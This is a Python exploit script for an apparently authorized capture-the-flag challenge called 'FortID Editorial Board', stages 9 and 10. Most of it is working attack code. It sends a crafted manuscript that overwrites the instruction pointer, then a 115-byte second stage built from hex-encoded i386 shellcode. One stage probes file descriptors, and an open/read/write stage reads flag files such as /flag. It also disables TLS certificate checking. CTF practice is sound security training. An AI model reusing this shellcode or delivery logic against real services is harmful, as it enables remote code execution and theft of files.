#!/usr/bin/env python3
"""FortID Editorial Board (authorized CTF instance), stages 9/10.

Requires the already validated 899-byte Stage-9 manuscript.
The client streams and timestamps all TLS responses, tests stdin stage delivery,
probes output descriptors 1..N, then (only after evidence of execution) attempts
an in-scope flag file using a 115-byte open/read/write shellcode.

No external Python dependencies.
"""
from __future__ import annotations

import argparse
from datetime import datetime
import hashlib
import json
from pathlib import Path
import re
import socket
import ssl
import sys
import time

DEFAULT_HOST = "editorial-board-93de8dfea1ed.inst2.ctf.fortid.com"
PROMPT = b"Submit your manuscript:"
REVIEW = b"The board is reviewing"
ACCEPT = b"Accepted by the anti-slop desk"
MARKER = b"STAGE2_FD_PROOF_2026\n"
FLAG_RE = re.compile(rb"FortID\{[^}\r\n]{1,180}\}")

# ELF32 i386: jmp/call/pop marker address; sys_write to fd=1..N; sys_exit(0).
# Disassembled from GNU as --32. Byte +0x10 = marker length; +0x19 = max fd.
PROBE_CORE = bytes.fromhex(
    "eb235ebb01000000b80400000089f1ba14000000cd804383fb0c7eec"
    "31dbb801000000cd80e8d8ffffff5354414745325f46445f50524f4f465f323032360a"
)
# ELF32 i386: call/pop pathname; sys_open, sys_read <=256, sys_write
# to fds 1..N, sys_exit. First 90 bytes contain PC-relative code;
# pathname follows. Byte 0x42 = max output fd.
ORW_PREFIX = bytes.fromhex(
    "eb535e89f331c931d26a0558cd8085c0783a89c381ec0001000089e1"
    "ba0001000031c0b003cd8085c07e2189c789e6bb01000000b8040000"
    "0089f189facd804383fb0c7eef31db6a0158cd80f7d889c36a0158cd80"
    "e8a8ffffff"
)
TRAMPOLINE = b"\xeb\x8e\x90"


def stage_payload(raw: bytes) -> bytes:
    """Stage9 overwrites from EIP+5; EIP resumes at +117. Jump back 114."""
    if len(raw) > 112:
        raise ValueError(f"Second-stage code+data too long: {len(raw)} > 112")
    out = raw + b"\x90" * (112 - len(raw)) + TRAMPOLINE
    assert len(out) == 115 and out[112:114] == b"\xeb\x8e"
    return out


def probe(fd_max: int) -> bytes:
    assert len(MARKER) == 21
    b = bytearray(PROBE_CORE)
    assert len(b) == 63 and b[-21:] == MARKER
    assert b[0x0f] == 0xba and b[0x10] == 20
    assert b[0x17:0x1a] == b"\x83\xfb\x0c"
    b[0x10] = len(MARKER)
    b[0x19] = fd_max
    return stage_payload(bytes(b))


def orw(path: str, fd_max: int) -> bytes:
    name = path.encode("utf-8")
    if not name or b"\x00" in name or len(name) > 21:
        raise ValueError("Path must be 1-21 bytes (UTF-8), without NUL")
    b = bytearray(ORW_PREFIX)
    assert len(b) == 90 and b[0x40:0x43] == b"\x83\xfb\x0c"
    b[0x42] = fd_max
    return stage_payload(bytes(b) + name + b"\0")


def manuscript_bytes(path: Path) -> bytes:
    data = path.read_bytes()
    if len(data) != 899:
        raise ValueError(f"Stage 9 must be precisely 899 bytes; got {len(data)}")
    if data[605:609] != b"able":
        raise ValueError("This is not the proven Stage9 EIP overwrite")
    if data[609+100] != 0x20 or data[609+115:609+117] != b" E":
        raise ValueError("Stage9 machine code differs from known winning variant")
    if data[-1:] not in (b".", b"?", b"!"):
        raise ValueError("Manuscript does not finish with punctuation")
    if b"\n" in data or b"\r" in data:
        raise ValueError("Manuscript unexpectedly contains newline")
    return data


class Link:
    def __init__(self, hostname: str, port: int):
        self.hostname, self.port = hostname, port
        self.t0 = time.monotonic()
        self.bytes = bytearray()
        self.closed = False
        self.s = None

    def log(self, *args):
        print(f"[{time.monotonic() - self.t0:6.2f}s]", *args, flush=True)

    def __enter__(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False  # ephemeral challenge certificate
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((self.hostname, self.port), timeout=10)
        self.s = ctx.wrap_socket(sock, server_hostname=self.hostname)
        self.log("TLS CONNECTED", self.hostname, self.port)
        return self

    def __exit__(self, et, ev, tb):
        if self.s is not None:
            self.s.close()

    def send(self, data: bytes, label: str):
        self.log("TX", label, len(data), "bytes")
        self.s.sendall(data)

    def until(self, token: bytes | None, seconds: float) -> bool:
        end = time.monotonic() + seconds
        while time.monotonic() < end and not self.closed:
            if token is not None and token in self.bytes:
                return True
            self.s.settimeout(min(1.0, max(.05, end-time.monotonic())))
            try:
                b = self.s.recv(8192)
            except socket.timeout:
                continue
            except (OSError, ssl.SSLError) as e:
                self.log("RX ERROR", repr(e)); self.closed = True; break
            if not b:
                self.log("EOF"); self.closed = True; break
            self.bytes.extend(b)
            self.log("RX", repr(b[:1500]))
        return token is not None and token in self.bytes


def send_one(args, article: bytes, second: bytes, timing: str, tag: str):
    try:
        with Link(args.host, args.port) as c:
            if not c.until(PROMPT, args.banner_timeout):
                c.log("NO PROMPT; no article sent")
                return b"", "no-prompt"
            first = article + b"\n"
            assert len(first) == 900
            if timing == "joint":
                c.send(first + second, "article+stage2 combined")
            else:
                c.send(first, "900-byte manuscript")
                if timing == "after-review":
                    if not c.until(REVIEW, args.deadline):
                        c.log("no reviewing token / EOF; no stage2")
                        return bytes(c.bytes), "no-review"
                elif timing == "after-accept":
                    if not c.until(ACCEPT, args.deadline):
                        c.log("no acceptance token / EOF; no stage2")
                        return bytes(c.bytes), "no-accept"
                c.send(second, "115-byte second stage")
            c.until(None, args.deadline)
            return bytes(c.bytes), "finished" if c.closed else "deadline"
    except (OSError, ssl.SSLError, TimeoutError) as e:
        print("CONNECTION ERROR:", repr(e), flush=True)
        return b"", "socket-error"


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", type=int, default=1337)
    ap.add_argument("--manuscript", default="manuscript_stage9_candidate_accept.txt", type=Path)
    ap.add_argument("--mode", choices=("auto", "proof", "orw"), default="auto")
    ap.add_argument("--timing", choices=("joint", "immediate", "after-review", "after-accept"), default="joint")
    ap.add_argument("--retry-timing", choices=("joint", "immediate", "after-review", "after-accept", "none"), default="after-review")
    ap.add_argument("--paths", nargs="*", default=["/flag", "/flag.txt", "/challenge/flag", "/challenge/flag.txt"])
    ap.add_argument("--fd-max", type=int, default=12)
    ap.add_argument("--deadline", type=float, default=50.0)
    ap.add_argument("--banner-timeout", type=float, default=12.0)
    ap.add_argument("--force-orw", action="store_true", help="Try flag reads even if proof is invisible")
    ap.add_argument("--build-only", action="store_true")
    ap.add_argument("--log-dir", type=Path, default=Path("editorial_remote_results"))
    args = ap.parse_args()

    if not 1 <= args.fd_max <= 32:
        ap.error("--fd-max must be 1..32")
    article = manuscript_bytes(args.manuscript)
    payload_probe = probe(args.fd_max)
    args.log_dir.mkdir(parents=True, exist_ok=True)
    (args.log_dir/"probe_115.bin").write_bytes(payload_probe)
    for n, path in enumerate(args.paths):
        (args.log_dir/f"orw_{n}_115.bin").write_bytes(orw(path, args.fd_max))
    print("ARTICLE",len(article),"SHA256",hashlib.sha256(article).hexdigest())
    print("PROBE",len(payload_probe),"MARKER",repr(MARKER),"FDS 1..",args.fd_max)
    print("PROTOCOL: 899 accepted bytes + LF, then 115 raw bytes")
    print("IMPORTANT: 'reviewing' does not mean the validator accepted the article")
    if args.build_only:return

    iteration = 0
    def one(second, timing, label):
        nonlocal iteration
        iteration += 1
        output, status = send_one(args, article, second, timing, label)
        logpath = args.log_dir/f"{iteration:02d}_{label}_{timing}.bin"
        logpath.write_bytes(output)
        print("\nRESULT",label,timing,"status",status,"received",len(output),
            "reviewing",REVIEW in output,"accepted",ACCEPT in output,
            "marker",MARKER in output)
        flags = FLAG_RE.findall(output)
        if flags:
            print("\nFLAG DETECTED:")
            for f in flags:print(f.decode("ascii","replace"))
        print("RAW RESPONSE FILE",logpath,"\n",flush=True)
        return output,flags

    proof_seen = False
    if args.mode in ("auto", "proof"):
        out,flags = one(payload_probe, args.timing, "proof")
        proof_seen = MARKER in out
        if not proof_seen and args.retry_timing not in ("none",args.timing):
            out,flags = one(payload_probe, args.retry_timing, "proof")
            proof_seen = MARKER in out
        print("STAGE2 PROVEN ON REMOTE:",proof_seen)
    if args.mode == "proof":return
    if args.mode == "auto" and not proof_seen and not args.force_orw:
        print("No stdout marker: remote Stage2 execution is not proven; ORW skipped.")
        print("If stdout is intentionally hidden, --force-orw can still try known CTF paths.")
        return
    for path in args.paths:
        print("TRY FLAG PATH",repr(path))
        _, found = one(orw(path,args.fd_max),args.timing,"orw"+str(args.paths.index(path)))
        if found:return
    print("No verified flag. Check the RX logs and binary/proxy behavior;")
    print("do not confuse a reviewing banner with exploit execution.")


if __name__ == "__main__":
    main()
